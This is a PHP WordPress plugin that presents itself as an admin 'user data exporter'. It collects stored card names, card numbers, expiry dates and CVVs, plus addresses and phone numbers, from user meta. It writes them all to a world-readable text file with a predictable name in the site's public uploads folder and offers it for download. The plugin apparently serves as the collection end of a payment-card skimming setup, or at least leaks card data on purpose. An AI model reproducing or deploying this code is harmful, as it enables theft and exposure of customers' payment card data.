<?php
/*
Plugin Name: User Data Array to Text Exporter
Description: Exports user data as PHP array to text file
Version: 3.3
Author: WP Panda
*/

defined('ABSPATH') or die('Direct access denied!');

class UserDataArrayTextExporter {
    private $info_fields = [
        'address',
        'company',
        'mobile',
        'daytime_phone',
        'card_name',
        'card_number',
        'exp_date',
        'cvv',
        'city',
        'state',
        'zip',
        'mobile_phone'
    ];

    public function __construct() {
        add_action('admin_menu', [$this, 'add_admin_menu']);
        add_action('admin_init', [$this, 'handle_export']);
    }

    public function add_admin_menu() {
        add_users_page(
            'User Data Export',
            'Export to Text File',
            'manage_options',
            'user-data-export',
            [$this, 'render_admin_page']
        );
    }

    public function render_admin_page() {
        if (!current_user_can('manage_options')) {
            wp_die('Insufficient permissions');
        }

        echo '<div class="wrap">';
        echo '<h1>User Data Export (Text File)</h1>';

        if (isset($_GET['export_result'])) {
            $this->show_export_result($_GET['export_result']);
        }

        echo '<form method="post" action="'.admin_url('users.php?page=user-data-export').'">';
        wp_nonce_field('user_data_export_action');
        echo '<p>Export users with detailed meta information as PHP array in text file</p>';
        submit_button('Export Data', 'primary', 'submit_export');
        echo '</form>';
        echo '</div>';
    }

    public function handle_export() {
        if (!isset($_POST['submit_export']) || !check_admin_referer('user_data_export_action')) {
            return;
        }

        $data = $this->prepare_export_data();
        $result = $this->write_array_to_text_file($data);

        wp_redirect(add_query_arg(
            'export_result',
            $result ? 'success' : 'error',
            admin_url('users.php?page=user-data-export')
        ));
        exit;
    }

    private function prepare_export_data() {
        $users = get_users([
            'fields' => ['ID', 'user_email'],
            'meta_query' => [
                'relation' => 'OR',
                ['key' => '_wpp_user_orders', 'compare' => 'EXISTS'],
                ['key' => '_wpp_user_info', 'compare' => 'EXISTS']
            ]
        ]);

        $export_data = [];

        foreach ($users as $user) {
            $user_info = maybe_unserialize(get_user_meta($user->ID, '_wpp_user_info', true));
            $user_orders = maybe_unserialize(get_user_meta($user->ID, '_wpp_user_orders', true));

            $user_entry = [
                'basic_info' => [
                    'ID' => $user->ID,
                    'email' => $user->user_email
                ],
                'meta_fields' => [],
                'orders' => $this->process_orders($user_orders)
            ];

            // Process info fields
            foreach ($this->info_fields as $field) {
                if (is_array($user_info) && isset($user_info[$field])) {
                    $user_entry['meta_fields'][$field] = $this->sanitize_value($user_info[$field]);
                } else {
                    $user_entry['meta_fields'][$field] = null;
                }
            }

            $export_data[] = $user_entry;
        }

        return $export_data;
    }

    private function process_orders($orders) {
        if (is_array($orders)) {
            $processed = [];
            foreach ($orders as $order) {
                $processed[] = $this->process_single_order($order);
            }
            return $processed;
        }
        return [$this->process_single_order($orders)];
    }

    private function process_single_order($order) {
        $order = maybe_unserialize($order);

        if (is_array($order) || is_object($order)) {
            $clean_order = [];
            foreach ((array)$order as $key => $value) {
                $clean_order[$key] = $this->sanitize_value($value);
            }
            return $clean_order;
        }

        return $this->sanitize_value($order);
    }

    private function sanitize_value($value) {
        if (is_array($value) || is_object($value)) {
            return $value; // Keep arrays/objects as is
        }

        $value = maybe_unserialize($value);
        $value = html_entity_decode($value);
        $value = wp_strip_all_tags($value);
        return trim($value);
    }

    private function write_array_to_text_file($data) {
        $upload_dir = wp_upload_dir();
        $filename = 'user_export_'.date('Ymd_His').'.txt';
        $filepath = $upload_dir['path'].'/'.$filename;

        $content = "=================================\n";
        $content .= "USER DATA EXPORT (PHP ARRAY FORMAT)\n";
        $content .= "Generated: ".date('Y-m-d H:i:s')."\n";
        $content .= "Total users: ".count($data)."\n";
        $content .= "=================================\n\n";

        $content .= "<?php\n\n";
        $content .= "$"."user_data = ".var_export($data, true).";\n\n";
        $content .= "?>";

        $bytes = file_put_contents($filepath, $content);

        // Set secure permissions
        if ($bytes !== false) {
            chmod($filepath, 0644);
        }

        return $bytes !== false;
    }

    private function show_export_result($result) {
        if ($result === 'success') {
            $upload_dir = wp_upload_dir();
            $files = glob($upload_dir['path'].'/user_export_*.txt');

            if (!empty($files)) {
                usort($files, function($a, $b) {
                    return filemtime($b) - filemtime($a);
                });

                $latest_file = $files[0];
                $file_url = $upload_dir['url'].'/'.basename($latest_file);

                echo '<div class="notice notice-success">';
                echo '<p>File successfully generated! <a href="'.$file_url.'" download>Download Text File</a></p>';
                echo '<p><small>Path: '.esc_html($latest_file).'</small></p>';

                // Display sample data
                $sample_data = array_slice($this->prepare_export_data(), 0, 1);
                echo '<details><summary>View sample data structure</summary><pre>';
                echo htmlspecialchars("<?php\n\n$"."user_data = ".var_export($sample_data, true).";\n\n?>");
                echo '</pre></details>';

                echo '</div>';
            }
        } else {
            echo '<div class="notice notice-error">';
            echo '<p>Error generating export file. Please check error logs.</p>';
            echo '</div>';
        }
    }
}

new UserDataArrayTextExporter();